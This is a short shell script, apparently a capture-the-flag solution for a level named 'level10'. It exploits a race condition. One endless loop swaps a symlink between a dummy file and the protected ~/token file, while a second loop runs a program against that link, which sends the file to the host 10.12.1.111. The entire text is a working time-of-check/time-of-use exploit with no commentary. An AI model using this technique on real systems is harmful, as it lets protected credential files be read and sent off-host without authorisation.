touch prout
chmod 666 prout

while true ; do ln -sf /tmp/toto/prout /tmp/toto/l1 ; ln -sf ~/token /tmp/toto/l1 ; done

while true ; do ~/level10 /tmp/toto/l1 10.12.1.111 ; done
